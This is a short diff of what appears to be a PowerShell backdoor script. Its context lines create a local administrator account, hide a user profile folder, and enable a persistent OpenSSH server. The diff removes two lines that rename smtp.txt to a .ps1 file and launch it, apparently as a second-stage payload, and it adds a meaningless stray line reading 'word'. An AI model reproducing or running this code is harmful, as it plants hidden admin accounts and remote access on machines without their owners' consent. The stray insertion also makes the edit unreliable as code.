@@ -2,7 +2,7 @@
 function randomText {
   return -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
 }
-
+word
 ## Create Local Admin FUNCTION
 function createAdmin {
   param (
@@ -42,9 +42,6 @@ Get-Item "C:\Users\$uName" -Force | ForEach-Object {$_.Attributes = $_.Attribute
 Set-Location $temp	
 New-Item -Path $temp -Name $dirName -Type Directory
 Set-Location $dirName
-
-Rename-Item ./smtp.txt ./smtp.ps1
-Start-Process smtp.ps1
 
 ## Enable persistent SSH
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
